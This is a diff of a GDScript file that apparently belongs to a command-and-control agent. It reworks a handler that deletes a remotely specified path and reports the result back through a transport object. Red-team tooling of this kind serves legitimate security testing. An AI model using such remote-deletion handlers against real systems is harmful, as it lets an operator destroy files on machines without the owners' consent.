@@ -1,11 +1,6 @@
 extends Node
 
-var api
-
-func _ready():
-	api = $".".get_parent().get_node("api")
-
-func _on_tasking_rm(task):
+func _on_tasking_rm(transport, task):
 
 	if task.has("command") and task.get("command") == "rm" and task.has("parameters"):
 		# TODO: spawn a thread?
@@ -20,8 +15,8 @@ func _on_tasking_rm(task):
 		if ret != OK:
 			output = "Error (%d) removing path: %s" % [ret, path]
 
-		api.send_agent_response(
-			api.create_task_response(
+		transport.send(
+			transport.create_task_response(
 				ret == OK,
 				true,
 				task.get("id"),
